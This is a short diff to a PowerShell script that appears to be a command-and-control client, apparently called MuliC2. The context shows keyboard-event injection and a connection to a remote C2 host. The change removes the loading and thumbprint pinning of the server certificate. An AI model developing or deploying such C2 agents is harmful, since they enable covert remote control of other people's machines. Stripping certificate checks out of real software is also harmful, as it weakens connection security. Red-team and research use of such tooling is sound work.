@@ -311,22 +311,7 @@ function Invoke-KeyboardEvent {
     }
 }
 
-# Automatically load the server certificate from the root folder and use its thumbprint
-if ($PSScriptRoot) {
-    $scriptDir = $PSScriptRoot
-} elseif ($MyInvocation.MyCommand.Path) {
-    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
-} else {
-    $scriptDir = Get-Location
-}
-$certPath = Join-Path $scriptDir 'server.crt'
-if (-Not (Test-Path $certPath)) {
-    Write-Host "[!] server.crt not found in script directory: $scriptDir" -ForegroundColor Red
-    exit 1
-}
-$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($certPath)
-$expectedThumbprint = $cert.Thumbprint.Replace(' ', '').ToUpper()
-Write-Host "[*] Loaded server cert thumbprint: $expectedThumbprint" -ForegroundColor Cyan
+# (No cert file loading or thumbprint logic needed)
 
 try {
     Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
